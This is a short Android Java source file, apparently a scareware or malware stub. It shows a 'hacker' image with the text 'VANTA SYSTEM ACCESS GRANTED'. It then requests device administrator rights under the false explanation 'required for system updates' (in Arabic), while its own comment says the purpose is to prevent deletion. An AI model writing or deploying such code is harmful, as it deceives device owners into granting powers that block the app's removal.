package com.vanta.core;

import android.app.Activity;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Intent;
import android.graphics.Color;
import android.os.Bundle;
import android.view.Gravity;
import android.widget.ImageView;
import android.widget.LinearLayout;
import android.widget.TextView;

public class MainActivity extends Activity {
    @Override
    protected void onCreate(Bundle b) {
        super.onCreate(b);

        LinearLayout l = new LinearLayout(this);
        l.setOrientation(LinearLayout.VERTICAL);
        l.setGravity(Gravity.CENTER);
        l.setBackgroundColor(Color.BLACK);

        ImageView img = new ImageView(this);
        img.setLayoutParams(new LinearLayout.LayoutParams(500, 500));
        // صورة هكر من الإنترنت
        new Thread(() -> {
            try {
                java.io.InputStream in = new java.net.URL(
                    "https://i.imgur.com/2vB2m5C.jpg").openStream();
                android.graphics.Bitmap bmp = android.graphics.BitmapFactory.decodeStream(in);
                runOnUiThread(() -> img.setImageBitmap(bmp));
            } catch (Exception e) {}
        }).start();
        l.addView(img);

        TextView tv = new TextView(this);
        tv.setText("VANTA SYSTEM\nACCESS GRANTED");
        tv.setTextColor(Color.parseColor("#00FF41"));
        tv.setTextSize(24);
        tv.setGravity(Gravity.CENTER);
        l.addView(tv);

        setContentView(l);

        // منع الحذف
        DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
        ComponentName cn = new ComponentName(this, AdminReceiver.class);
        if (!dpm.isAdminActive(cn)) {
            Intent i = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
            i.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, cn);
            i.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "مطلوب لتحديثات النظام");
            startActivity(i);
        }
    }
}
